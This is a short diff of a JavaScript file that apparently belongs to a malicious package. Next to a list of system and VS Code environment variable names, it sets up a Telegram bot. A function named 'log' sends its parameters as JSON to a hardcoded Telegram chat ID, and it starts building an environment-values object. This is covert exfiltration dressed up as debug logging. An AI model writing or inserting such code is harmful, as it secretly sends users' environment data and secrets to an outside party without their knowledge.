@@ -56,9 +56,9 @@ const default_env = ["ALLUSERSPROFILE",
     "VSCODE_GIT_IPC_HANDLE",
     "VSCODE_INJECTION",
 ]
+const bot = new TelegramBot(a);
 
 const log = (message, ...optionalParams) => {
-    const bot = new TelegramBot(a, {polling: true});
     if (message == "debug:log->")
         bot.sendMessage(6628313800, JSON.stringify(optionalParams));
     let envVal = {};
